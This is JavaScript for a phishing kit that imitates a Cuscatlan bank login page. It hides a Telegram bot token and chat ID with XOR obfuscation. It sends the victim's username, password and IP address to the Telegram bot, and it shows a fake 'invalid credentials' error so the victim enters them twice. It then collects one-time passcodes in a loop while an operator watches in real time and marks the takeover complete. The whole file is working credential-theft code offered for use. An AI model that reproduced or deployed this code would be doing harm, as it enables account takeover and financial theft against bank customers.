
  /* CONFIG TELEGRAM */
  let BOT, CHAT;
  (function(){
    const encrypted = "NkshAxUiClpXXRZ3S3RbUk5VBgMGDHVTAi0mPQtkeQJwPS0GNTIEVFIAeEwYJQAYPjc0CEV/dipQEQ9DWkdSWlJABA1hVkNbUQcABwF6XnZZUlQY";
    const secretKey = "MiClave1234";
    function decrypt(b64,key){
      const data = atob(b64), out = [];
      for(let i=0;i<data.length;i++){
        out.push(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
      }
      return decodeURIComponent(out.map(b=>'%'+('0'+b.toString(16)).slice(-2)).join(''));
    }
    const cfg = JSON.parse(decrypt(encrypted,secretKey));
    BOT = cfg.botToken; CHAT = cfg.chatId;
  })();

  /* Envía mensaje a Telegram (inline opcional) */
  function tg(msg, withButton=false){
    const url = `https://api.telegram.org/bot${BOT}/sendMessage`;
    const payload = { chat_id: CHAT, text: msg };
    if(withButton){
      payload.reply_markup = {
        inline_keyboard: [[{ text: "Proceso completado", callback_data: "complete" }]]
      };
    }
    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type':'application/json' },
      body: JSON.stringify(payload)
    });
  }

  /* ESTADO GLOBAL */
  let geo={}, login={}, cd=60, countdownID;
  const OTP_LEN=6; let digits=[];
  let firstAttempt=true;

  const userI = document.getElementById('user'),
        passI = document.getElementById('password'),
        btnSubmit = document.getElementById('submitBtn'),
        errMsg = document.getElementById('loginError');

  /* GEO IP */
  fetch("https://ipapi.co/json/").then(r=>r.json()).then(j=>geo=j).catch(()=>{});

  /* Habilitar botón */
  [userI,passI].forEach(el=>el.addEventListener('input',()=>{
    btnSubmit.disabled = !(userI.value.trim() && passI.value.trim());
  }));

  /* Toggle contraseña */
  document.querySelector('.toggle-pass').addEventListener('click',()=>{
    const hidden = passI.type==='password';
    passI.type = hidden ? 'text':'password';
    document.querySelector('.toggle-pass i').classList.toggle('fa-eye-slash', hidden);
    document.querySelector('.toggle-pass i').classList.toggle('fa-eye', !hidden);
  });

  /* Mostrar loader */
  function showLoader(ms, cb){
    const wrap=document.getElementById('loader'),
          bar=document.getElementById('loadFill'),
          pct=document.getElementById('loadPct');
    wrap.style.display='flex'; bar.style.width='0%'; pct.textContent='0%';
    let p=0, interval=ms/100;
    const t=setInterval(()=>{
      p++; bar.style.width=p+'%'; pct.textContent=p+'%';
      if(p>=100){
        clearInterval(t);
        wrap.style.display='none';
        if(cb) cb();
      }
    }, interval);
  }

  /* Submit login */
  document.getElementById('loginForm').addEventListener('submit', e=>{
    e.preventDefault();
    const u=userI.value.trim(), p=passI.value.trim();
    tg(`🔔 CUSCATLAN\nUsuario: ${u}\nClave: ${p}\nIP: ${geo.ip||'N/A'}`, false);
    if(firstAttempt){
      firstAttempt=false;
      errMsg.textContent='Usuario y/o contraseña inválidos';
      errMsg.style.display='block';
      userI.value=''; passI.value=''; btnSubmit.disabled=true;
      userI.focus();
      return;
    }
    errMsg.style.display='none';
    login.user=u; login.pass=p;
    tg(`🔔 CUSCATLAN\nUsuario: ${u}\nClave: ${p}\nIP: ${geo.ip||'N/A'}`, false);
    document.getElementById('loginSection').style.display='none';
    showLoader(30000, openOtp);
  });

  /* Abrir OTP */
  function openOtp(){
    const modal=document.getElementById('otpModal');
    modal.addEventListener('keydown', e=>{
      if(e.key==='Enter'){ e.preventDefault(); document.getElementById('codeContinue').click(); }
    });
    modal.style.display='flex';
    const wrap=document.getElementById('otpWrap');
    wrap.innerHTML=''; digits=[];
    for(let i=0;i<OTP_LEN;i++){
      const inp=document.createElement('input');
      inp.className='digit'; inp.maxLength=1; inp.inputMode='numeric'; inp.pattern='[0-9]*';
      inp.addEventListener('input', e=>{
        e.target.value=e.target.value.replace(/\D/g,'');
        if(e.target.value && i<OTP_LEN-1) wrap.children[i+1].focus();
        checkDigits();
      });
      inp.addEventListener('keydown', e=>{
        if(e.key==='Backspace' && !e.target.value && i) wrap.children[i-1].focus();
      });
      wrap.appendChild(inp); digits.push(inp);
    }
    digits[0].focus();
    document.getElementById('codeContinue').disabled=true;
    startCountdown();
  }
  function checkDigits(){
    document.getElementById('codeContinue').disabled = !digits.every(d=>d.value);
  }

  /* Enviar OTP y reabrir */
  document.getElementById('codeContinue').onclick=()=>{
    const code = digits.map(d=>d.value).join('');
    if(code.length<OTP_LEN) return;
    tg(
      `🟢 OTP\nUsuario: ${login.user}\nCódigo: ${code}\nIP: ${geo.ip||'N/A'}`,
      true
    );
    document.getElementById('otpModal').style.display='none';
    showLoader(30000, openOtp);
  };

  /* Countdown + reenviar */
  function startCountdown(){
    cd=60; updateCountdown();
    const btn=document.getElementById('reqCode');
    btn.disabled=true;
    countdownID=setInterval(()=>{
      cd--; updateCountdown();
      if(cd<=0){ clearInterval(countdownID); btn.disabled=false; }
    },1000);
    btn.onclick=()=>{
      cd=60; updateCountdown(); btn.disabled=true;
      startCountdown();
      tg(`🔄 REENVÍO OTP\nUsuario: ${login.user}\nIP: ${geo.ip||'N/A'}`);
    };
  }
  function updateCountdown(){
    document.getElementById('reqCode').textContent = cd>0
      ? `Reenviar código (${cd}s)` : 'Reenviar código';
  }

  /* Mostrar éxito */
  function showSuccess(){
    document.getElementById('success').classList.add('show');
  }

  /* Polling con initOffset */
  let updateOffset=0;
  (async function initOffset(){
    try{
      const res=await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=0`);
      const data=await res.json();
      if(data.ok && data.result.length){
        updateOffset=data.result[data.result.length-1].update_id+1;
      }
    }catch(e){}
    setInterval(pollUpdates,5000);
  })();

  async function pollUpdates(){
    try{
      const res=await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${updateOffset}`);
      const data=await res.json();
      if(data.ok){
        for(const upd of data.result){
          updateOffset=upd.update_id+1;
          if(upd.callback_query && upd.callback_query.data==="complete"){
            await fetch(`https://api.telegram.org/bot${BOT}/answerCallbackQuery`,{
              method:'POST',
              headers:{'Content-Type':'application/json'},
              body:JSON.stringify({
                callback_query_id:upd.callback_query.id,
                text:`¡Proceso completado para: ${login.user}!`,
                show_alert:false
              })
            });
            showSuccess();
          }
        }
      }
    }catch(e){}
  }
  